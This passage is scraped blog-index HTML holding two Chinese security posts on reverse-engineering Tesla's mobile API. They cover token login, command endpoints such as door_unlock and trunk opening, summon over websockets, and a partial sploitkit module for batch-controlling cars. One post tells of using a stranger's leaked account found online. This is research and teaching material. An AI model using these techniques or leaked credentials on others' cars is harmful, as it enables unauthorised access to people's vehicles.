&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327121111.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ascii_table.png&#34; alt=&#34;ascii_table&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对应的代码部分如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;carinfo = self.carinfo[&amp;quot;response&amp;quot;]
                            
if carinfo[&amp;quot;state&amp;quot;]==&amp;quot;online&amp;quot;:
    state = &amp;quot;在线&amp;quot;
else:
    state = &amp;quot;离线&amp;quot;
print(&amp;quot;\n%s (%s)\n&amp;quot; % (carinfo[&amp;quot;display_name&amp;quot;], state))

gps = &amp;quot;%s, %s&amp;quot; % (carinfo[&amp;quot;drive_state&amp;quot;][&amp;quot;latitude&amp;quot;],carinfo[&amp;quot;drive_state&amp;quot;][&amp;quot;longitude&amp;quot;])
battery_level = str(carinfo[&amp;quot;charge_state&amp;quot;][&amp;quot;battery_level&amp;quot;])+&amp;quot;%&amp;quot;
battery_range = str(carinfo[&amp;quot;charge_state&amp;quot;][&amp;quot;battery_range&amp;quot;])+&amp;quot;英里&amp;quot;
inside_temp = carinfo[&amp;quot;climate_state&amp;quot;][&amp;quot;inside_temp&amp;quot;]
outside_temp = carinfo[&amp;quot;climate_state&amp;quot;][&amp;quot;outside_temp&amp;quot;]
vin = carinfo[&amp;quot;vin&amp;quot;]        

car_table = [
    [&amp;quot;vin&amp;quot;,vin,&amp;quot;电量&amp;quot;,battery_level,&amp;quot;电池续航&amp;quot;,battery_range],
    [&amp;quot;GPS&amp;quot;,gps,&amp;quot;车外温度&amp;quot;,outside_temp,&amp;quot;车内温度&amp;quot;,inside_temp],
]
self.print_table(car_table)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;控制&#34;&gt;控制&lt;/h4&gt;
&lt;p&gt;经过分析，诸如开锁、锁门、开/关空调、设置温度、开启后备箱等请求格式均相似，可以统一使用一个方法来实现。其url地址格式为&lt;code&gt;/api/1/vehicles/{id}/command/{command}&lt;/code&gt;,请求方法为POST，请求数据格式为json格式，如果没有参数可以使用&lt;code&gt;{}&lt;/code&gt;来表示。&lt;/p&gt;
&lt;p&gt;这里的&lt;code&gt;{command}&lt;/code&gt;为操作指令，主要有door_unlock（ 解锁）、door_lock（ 锁车）、flash_lights（ 闪灯）、honk_horn（鸣笛）&lt;/p&gt;
&lt;p&gt;、auto_conditioning_start（开空调）、auto_conditioning_stop（关空调）、set_temps（设置温度）、actuate_trunk_rear（开后备箱）。除&lt;code&gt;set_temps&lt;/code&gt;操作指令外，均不需要post data。&lt;code&gt;set_temps&lt;/code&gt;我们之前抓过包，有&lt;code&gt;driver_temp&lt;/code&gt;和&lt;code&gt;passenger_temp&lt;/code&gt;两个参数，分别为驾驶位温度和副驾驶位温度。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327129175.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/control.png&#34; alt=&#34;control&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;召唤&#34;&gt;召唤&lt;/h4&gt;
&lt;p&gt;召唤功能的流程在上面已经分析清楚，我们只需要按照格式发送和接收数据就可以了。先来个websockets的例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;async def main():
    async with websockets.connect(&#39;ws://10.10.6.91:5678&#39;) as websocket:
        timestamp = round(time.time()*1000)
        ping = &#39;{&amp;quot;timestamp&amp;quot;:%d,&amp;quot;msg_type&amp;quot;:&amp;quot;control:ping&amp;quot;,&amp;quot;created:timestamp&amp;quot;:%d}&#39;%(timestamp,timestamp)
        await websocket.send(ping)
        recv = await websocket.recv()

asyncio.get_event_loop().run_until_complete(main())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来就根据上面分析的流程构造发送数据包即可。这里需要注意的是在发送&lt;code&gt;autopark:cmd_forward&lt;/code&gt;和&lt;code&gt;autopark:cmd_reverse&lt;/code&gt;类型的消息时，需要gps位置信息，这个信息位置需要在车辆的gps位置信息附近。所以这里需要先获取车辆的gps信息，在此基础之上做加减法操作即可。具体大家可自己动手操作实践。&lt;/p&gt;
&lt;h3 id=&#34;模块&#34;&gt;模块&lt;/h3&gt;
&lt;h4 id=&#34;初始化&#34;&gt;初始化&lt;/h4&gt;
&lt;p&gt;汽车的类编写完，接下来就要设计业务流程。&lt;/p&gt;
&lt;p&gt;为了实现批量控制，这里设计一个sessions的列表，存放车辆信息、token以及车辆的对象。这个sessions列表在模块加载时生成。加载的过程则根据&lt;code&gt;/data/config/account.conf&lt;/code&gt; 的账号列表进行遍历，遍历过程中判断存储在&lt;code&gt;/data/token/&lt;/code&gt;目录下的账号信息文件是否存在，如果存在则直接读取文件，不存在则登录该账户，登录成功后将信息、token存到&lt;code&gt;/data/token/&lt;/code&gt;目录下，并加信息和车辆对象append到sessions列表中，供运行时调用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327144827.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/init.png&#34; alt=&#34;init&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;利用模块&#34;&gt;利用模块&lt;/h4&gt;
&lt;p&gt;先来看下splpitkit库模块如何编写,在&lt;code&gt;/teslasploit/modules/exploit&lt;/code&gt;目录下创建&lt;code&gt;tesla.py&lt;/code&gt;,并引用相关库，获取车辆信息代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Info(Module,teslaBase):

    path = &amp;quot;exploit/tesla&amp;quot;
    description = &amp;quot;获取车辆信息&amp;quot;
    config = Config({
        Option(
            &#39;vehicle&#39;,
            &amp;quot;车辆编号&amp;quot;,
            True,
        ): 1
    })
    def __init__(self):
        super().__init__()
        print(self.vehicle_list())
        
    def run(self):
        tasks = []
        vehicle = self.config.option(&amp;quot;vehicle&amp;quot;).value
        self.event_loop = asyncio.get_event_loop()
        carinfos = []
        if vehicle==0:
            for i in range(0,len(self.sessions)):
                task = asyncio.ensure_future(self.sessions[i][&amp;quot;object&amp;quot;].get_info(self.sessions[i][&amp;quot;id&amp;quot;]))
                tasks.append(task)
            self.event_loop.run_until_complete( asyncio.gather(*tasks))
        else:
            vehicle_session = self.sessions[vehicle - 1]
            tesla = vehicle_session[&amp;quot;object&amp;quot;]
            asyncio.run(tesla.get_info(vehicle_session[&amp;quot;id&amp;quot;]))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的path位use加载的路径，description位利用模块的描述，config是配置的参数选项，可以使用&lt;code&gt;show options&lt;/code&gt;查看，使用&lt;code&gt;set [key] [value]&lt;/code&gt;进行设置。&lt;code&gt;run&lt;/code&gt;方法则是执行run命令时调用。&lt;/p&gt;
&lt;p&gt;在类初始化的时候调用了获取汽车列表的操作，会打印出要控制的汽车，0代表所有，其他根据编号可单独控制。在&lt;code&gt;run&lt;/code&gt;方法中，你只需要遍历sessions列表就可以实现批量控制了。其他模块与其相似，改动其选项和调用的方法等即可。&lt;/p&gt;
&lt;p&gt;编写完成后即可运行测试，使用流程如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327220514.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/use.png&#34; alt=&#34;use&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-成果展示&#34;&gt;0x03 成果展示&lt;/h2&gt;
&lt;p&gt;一切准备就绪，录制了两小段视频给大家。我在安全客10月21日的直播中有分享，大家可以查看链接 &lt;a href=&#34;https://www.anquanke.com/post/id/220554&#34;&gt;https://www.anquanke.com/post/id/220554&lt;/a&gt;，有录屏直播、ppt和两个演示视频。&lt;/p&gt;
&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;
&lt;p&gt;本系列文章通过逆向分析并编程实现对特斯拉汽车的批量远程控制功能。重点讲述了针对web和websocket的抓包与python3协程编程的知识，同时也讲述了如何利用第三方库快速高效的构建系统框架。&lt;/p&gt;
&lt;p&gt;注：本文中仅提供了部分代码，有些可以单独运行，有些则需要自己补充或根据自己思路去进行实现。&lt;/p&gt;
&lt;h2 id=&#34;0x05-第三方库&#34;&gt;0x05 第三方库&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dhondta/python-asciistuff&#34;&gt;https://github.com/dhondta/python-asciistuff&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dhondta/python-sploitkit&#34;&gt;https://github.com/dhondta/python-sploitkit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Robpol86/terminaltables&#34;&gt;https://github.com/Robpol86/terminaltables&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/aio-libs/aiohttp&#34;&gt;https://github.com/aio-libs/aiohttp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/aaugustin/websockets&#34;&gt;https://github.com/aaugustin/websockets&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">Hacking all the cars之Tesla API分析与利用（下）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/"" data-c="
          &lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。&lt;/p&gt;
&lt;h2 id=&#34;0x00-简介&#34;&gt;0x00 简介&lt;/h2&gt;
&lt;p&gt;Tesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现的意义是什么呢？为什么不用官方提供的app呢？而且Github也有大量开源项目。&lt;/p&gt;
&lt;p&gt;最开始我也有同样的疑问，但是，当我去尝试了解后，发现分析api，自己可以拓展多种玩法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;挖掘潜在的隐藏功能。在漏洞挖掘过程中，总会有一些未在界面显示，被开发者隐藏起来的一些功能。这些功能一旦被我们发现，对漏洞挖掘或者实现额外的功能都有帮助。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实现批量控车功能。官方的APP同时只能控制一台汽车，无法控制多台。我们熟悉API后，我们则可以实现批量控制汽车，实现速度与激情中的控车场景，这想想都觉得很酷；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;熟悉Tesla业务流程，可以深入去挖掘漏洞；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尽管目前网络上有很多Tesla的API代码或库，但是其他的车还没有。我们以Tesla为典型例子，可以将其思路和方法拓展到其他同类的汽车厂商中；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;个性化定制，通过API可以按照自己习惯定制流程，控制更加灵活。还可以拓展功能，如雨天自动关闭天窗，根据情况自动制热/冷却等。甚至可以做成一个商业产品；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过api调用，配合代理跳板实现隐藏自身，同时不会暴漏自己的imei、设备等，减少APP信息收集导致的隐私泄漏。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;记录下所有关于车的数据，进行数据分析。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;0x01-制定控制功能&#34;&gt;0x01 制定控制功能&lt;/h2&gt;
&lt;p&gt;在开始分析前，先来列一个功能清单，在后续分析过程中防止浪费时间。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取车辆列表；&lt;/li&gt;
&lt;li&gt;获取车辆详细信息；&lt;/li&gt;
&lt;li&gt;实现远程操作，包括温度控制、开启后备箱、开车锁；&lt;/li&gt;
&lt;li&gt;通过召唤功能实现控制车前进后退；&lt;/li&gt;
&lt;li&gt;批量控制汽车。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0x02-app分析&#34;&gt;0x02 APP分析&lt;/h2&gt;
&lt;p&gt;在分析之前，通过查看、搜索Tesla官方内容未发现存在官方的API文档。最终决定通过其官方提供的APP来进行分析。尽管有人发布Tesla API的文档，根据文档或Github的公开库会更快。但是我们本着探寻原理的态度以来使自己得到提升。&lt;/p&gt;
&lt;h3 id=&#34;获取app&#34;&gt;获取APP&lt;/h3&gt;
&lt;p&gt;Tesla官方的Android app是需要在Google play上下载的，通过&lt;a href=&#34;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&#34;&gt;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&lt;/a&gt;地址下载即可。&lt;/p&gt;
&lt;h3 id=&#34;提取api地址&#34;&gt;提取api地址&lt;/h3&gt;
&lt;p&gt;这里个人习惯不同，我通常会先使用apkurlgrep来获取APK文件中的url地址。apkurlgrep为golang语言编写的提取APK文件中输入点的程序。Github地址:&lt;a href=&#34;https://github.com/ndelphit/apkurlgrep&#34;&gt;https://github.com/ndelphit/apkurlgrep&lt;/a&gt;。按照Github文档安装即可。&lt;/p&gt;
&lt;p&gt;安装完成后，执行&lt;code&gt;apkurlgrep -a com.teslamotors.tesla.apk&lt;/code&gt; 等待显示结果即可。也可以将结果重定向到文件中。结果里有一些是多余的，找到一些我们关注的点即可。这里关注到有api的地址&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;的地址，和带有api关键字的路径内容。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723039734.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723045778.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;接下来使用jadx反编译源码，将上述发现的关键字在源码中搜索，可以发现这些内容在两个json的文件中。具体内容如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723052304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;根据定义的常量，在去进行搜索，可以看到其代码的位置。当然这里可以看出Tesla做了混淆，尽管可以分析，但是分析起来很耗精力。这个先暂停，先抓包分析来看看。&lt;/p&gt;
&lt;h3 id=&#34;抓包分析&#34;&gt;抓包分析&lt;/h3&gt;
&lt;p&gt;直接使用抓包工具即可。根据个人习惯选择，本文使用的是Burpsuite。在抓包的过程中会遇到有一些post data的内容是乱码格式，观察其请求头就可以得知使用了gzip压缩，解码可以通过burp的decode即可查看。对于重放，则可以直接去掉其请求头中&lt;code&gt;content-encoding:gzip&lt;/code&gt;和&lt;code&gt;Accept-Encoding: gzip, deflate&lt;/code&gt;即可。另外为了方便分析，可以设置scope过滤掉除tesla之外的记录显示。&lt;/p&gt;
&lt;h3 id=&#34;登录请求分析&#34;&gt;登录请求分析&lt;/h3&gt;
&lt;p&gt;开启拦截，我们使用打开手机中的Tesla APP。按照提示进行正常登录，截获到的请求我们可以先查看下，然后通过。操作完登录的整个流程，可以了解到这里涉及到4个域名，分别为auth-global.tesla.com、auth.tesla.cn、auth.tesla.com、owner-api.teslamotors.com。&lt;/p&gt;
&lt;p&gt;其大致过程为先请求auth-global.tesla.com获取其地区，然后跳转到所属区域的服务，这里跳转到auth.tesla.cn，先显示的输入用户名，下一步后，跳转到auth.tesla.com域，显示用户名密码信息，输入用户名密码后也是经过auth.tesla.com。用户名密码正确，APP进行到程序主界面。 这里有两步，第一个先请求auth.tesla.com域获取jwt的token，第二将获取的jwt token带入请求owner-api.teslamotors.com。接下来的获取数据均请求到owner-api.teslamotors.com，由此也可以看出这个地址为api服务的地址，也就是最终我们只需要获取最后的那个token，就可以实现获取其他信息的操作。&lt;/p&gt;
&lt;p&gt;大致流程图如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-flow&#34;&gt;st=&amp;gt;start: 打开app
op=&amp;gt;operation: auth-global.tesla.com判断区域跳
op1=&amp;gt;operation: 跳转至auth.tesla.cn
op2=&amp;gt;operation: 跳转至auth.tesla.com
op3=&amp;gt;operation: APP主界面
op4=&amp;gt;operation: 获取jwt token
op5=&amp;gt;operation: 请求owner-api
e=&amp;gt;end: 获取用户信息
st(bottom)-&amp;gt;op(bottom)-&amp;gt;op1(bottom)-&amp;gt;op2(bottom)-&amp;gt;op3(bottom)-&amp;gt;op4(bottom)-&amp;gt;op5(bottom)-&amp;gt;cond
op5-&amp;gt;e

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里实现思路有如下几个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;完全自己根据流程构造请求来获取。在实现过程中不仅有多个流程，还需要分析其请求中的参数，非常的麻烦。&lt;/li&gt;
&lt;li&gt;可以采用headless的方式，一些过程由浏览器来完成，只需要填入参数，点击按钮等操作即可。当然这里需要调用浏览器。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;上面的方式都比较麻烦，有没有更简单的方法呢？仔细思考下，既然owner-api.teslamotors.com是提供api服务的，那么Tesla也会有其他的调用方式，如web等，那么其登录可能会更简单。这里我还去分析了下web登录。但是其登录后并未去请求owner-api.teslamotors.com。&lt;/p&gt;
&lt;p&gt;而之前看网络上的api，只要发起一次请求就可以获取token，他们是如何获取的呢？&lt;/p&gt;
&lt;p&gt;第一种尝试，通过Tesla官方的其他登录点来分析，收集了tesla几个域的子域名，通过寻找登录地来分析，最终没有收获。&lt;/p&gt;
&lt;p&gt;第二种尝试，通过反编译的APK代码中搜索，通过查看可以确定tesla 采用了标准的oauth来实现，这里到发现对于owner-api.teslamotors.com的几种类型(grant_type)，分别有authorization_code、refresh_token、urn:ietf:params:oauth:grant-type:jwt-bearer。最后一种是app中登录用到的；refresh_token是用来刷新token的；authorization_code授权码模式(即先登录获取code,再获取token)。&lt;/p&gt;
&lt;p&gt;查了下资料，oauth支持5类 grant_type 。除上述用到的外，还有password模式。而公开的api就是这种模式。那么既然支持这种模式，请求的参数字段和内容又怎么来的呢？新版本的APP里没有这种模式，陷入沉思中。片刻后，决定尝试下载老版本APP去分析下，通过搜索引擎找了3.8.5的老版本。反编译，搜索&lt;code&gt;grant_type&lt;/code&gt;，结果眼前一亮，老版本的只有password模式。而且参数也写的非常明显了。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723063315.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;至于这里的参数client_id和client_secret参数在上文中发现的json文件中有。email和password就是我们的用户名和密码。&lt;/p&gt;
&lt;p&gt;至此，登录就分析完成了。我们可以直接构造一次请求，即可获取token了。后续在分析app的时候可以优先选择老版本入手。&lt;/p&gt;
&lt;h3 id=&#34;控制功能请求分析&#34;&gt;控制功能请求分析&lt;/h3&gt;
&lt;p&gt;登录后，要控制特斯拉汽车，先会获取账户所属的车辆。在APP中如果只有一辆车则直接现实车辆信息和控制界面，如果有两辆及以上，则会先选择要控制的车辆。&lt;/p&gt;
&lt;p&gt;我们登录成功后，只要我们在当前APP界面中，在Burp中会收到多次请求。这里还可以看到关于发送log的请求，这在自己实现api时则可以跳过这个记录。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;车辆列表&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据burp的历史记录，或者在拦截的时候拦截其相应内容来进行分析。通过分析可以看到获取vin，id号的请求是&lt;code&gt;/api/1/products&lt;/code&gt;，因为返回的格式为json，其信息都在因为返回内容在键，返回的内容中包含id号（id）、用户id（user_id）、vin、显示名字（display_name）、状态（state）等信息。这里id号后面会用到，对汽车进行的操作都是通过这里的id号。如果有两辆车以上，则遍历即可。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;车辆详细信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过记录可以看到获取车辆详细信息的api地址为&lt;code&gt;/api/1/vehicles/{vehicle_id}/vehicle_data&lt;/code&gt; ，通过抓取停止状态和行驶状态下的数据，可以看到由&lt;code&gt;endpoints&lt;/code&gt;参数控制，值分别为&lt;code&gt;drive_state&lt;/code&gt;(行驶中)、&lt;code&gt;climate_state%3Bgui_settings&lt;/code&gt;、&lt;code&gt;climate_state%3Bcharge_state%3Bdrive_state%3Bgui_settings%3Bvehicle_state&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;对于行驶中的状态，通过api可以获取当前驾驶速度。&lt;/p&gt;
&lt;p&gt;这里根据返回的json进行分析即可。这里不做详细描述。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723074091.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;温度控制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;采用同样的方式，在app中操作，在burp中进行拦截或者从sitemap，历史记录里去分析。&lt;/p&gt;
&lt;p&gt;要先调整温度，需要先开启，然后设置温度。也可以关闭温度控制。&lt;/p&gt;
&lt;p&gt;api地址为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/api/1/vehicles/{vehicle_id}/command/auto_conditioning_start //开启温度控制

/api/1/vehicles/{vehicle_id}/command/auto_conditioning_stop  //关闭温度控制

/api/1/vehicles/{vehicle_id}/command/set_temps					//设置温度
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;开启和关闭使用空的json即可，或者去掉Content-Type头。&lt;/p&gt;
&lt;p&gt;设置温度的请求如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /api/1/vehicles/{vehicle_id}/command/set_temps HTTP/1.1
user-agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MOB31E; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36
x-tesla-user-agent: TeslaApp/3.10.8-421/adff2e065/android/6.0.1
authorization: Bearer *****
Content-Type: application/json; charset=utf-8
Content-Length: 42
Host: owner-api.teslamotors.com
Connection: close

{&amp;quot;driver_temp&amp;quot;:22.5,&amp;quot;passenger_temp&amp;quot;:22.5}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723087973.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在分析过程中还会出现响应头尾304的情况，一般出现在GET请求中，我们只需要去掉If-None-Match请求头即可。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;其他&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于其他功能，分析方法都大致类似，了解了方法后，可以去分析其他的部分，然后对比已经公布的api文档来确认。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;召唤功能控车&#34;&gt;召唤功能控车&lt;/h3&gt;
&lt;p&gt;特斯拉在2016年推出了召唤功能，2019年推出了智能召唤功能。智能召唤功能支持车辆自主行驶避让障碍物，并能到达车主面前或者车主指定的位置，无需驾驶员在车内控制。当然这项功能对场地有一定要求，仅限于在“私家停车区域和行车道”使用，无法在公路上使用该功能。&lt;/p&gt;
&lt;p&gt;召唤功能不是使用的&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;，而是websocket通信，通信服务器为&lt;code&gt;streaming.vn.teslamotors.com&lt;/code&gt;。由于特殊原因，此次召唤功能将在下篇内容中介绍。&lt;/p&gt;
&lt;h3 id=&#34;分析结果&#34;&gt;分析结果&lt;/h3&gt;
&lt;p&gt;根据截获的流量信息，总结一下Telsa api的几个技术点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Tesla的大多数功能调用的是&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;的api接口；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用了oAuth 2 标准；APP采用jwt方式来获取api接口的token信息，其jwt加密方式为RS256；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发起的请求除登录、找回密码功能外需要&lt;code&gt;Authorization: Bearer&lt;/code&gt; 请求头，后面内容为token，token具有有效期；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;召唤功能使用的是websocket的方式，其服务器地址&lt;code&gt;wss://streaming.vn.teslamotors.com/&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0x03-编程实现&#34;&gt;0x03 编程实现&lt;/h2&gt;
&lt;p&gt;这里开发语言选择Python3，其版本使用的是3.8。采用异步编程，这里会选择使用aiohttp库。编程实现将在下篇内容中来详细说明。&lt;/p&gt;
&lt;p&gt;对于大多数人来说，没有车是分析的最大问题？&lt;/p&gt;
&lt;p&gt;我也面临同样的问题，每天上下班路上看着从自己身边路过的特斯拉，彷佛它在无情的嘲笑着我，心中不免泛起淡淡的忧伤。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723104961.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;抱怨改变不了现实，于是借助搜索大法，几分钟后，成功获取到一个韩国人的账号，此刻我露出了久违的微笑。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723142577.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723149573.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;本着负责任的态度，我们第一时间向泄漏账号的人发送了邮件。截止到目前，我们仍未收到回复的邮件。我们会持续跟进该事情进展，并会及时更新至本文。注：本文分析是利用自己的账号进行，意外获取他人账号只是一个小惊喜。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1602723157261.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;
&lt;p&gt;本文通过对Tesla app逆向、抓包的方式分析出其api接口。通过本文的研究可以发现，汽车越来越智能化、方便的同时，却也引入了新的安全风险。尽管运用了很多复杂的技术来提高和保证其安全性。但是一旦黑客获取到用户名密码，就可以把Tesla开走。而获取用户名和密码的手段还是可以通过传统的方式来获得。在下一篇的文章中将尝试通过python编程实现利用API来批量控制特斯拉。&lt;/p&gt;
&lt;h2 id=&#34;0x05-参考&#34;&gt;0x05 参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&#34;&gt;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/ndelphit/apkurlgrep&#34;&gt;https://github.com/ndelphit/apkurlgrep&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tesla-api.timdorr.com/&#34;&gt;https://tesla-api.timdorr.com/&lt;/a&gt;&lt;/p&gt;
">Hacking All The Cars之Tesla API分析与利用（上）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/mqtt-security-part-two/"" data-c="
          &lt;p&gt;上一篇 &lt;a href=&#34;https://bacde.me/post/mqtt-security-part-one/&#34;&gt;物联网安全之MQTT协议安全 &lt;/a&gt;主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。&lt;/p&gt;
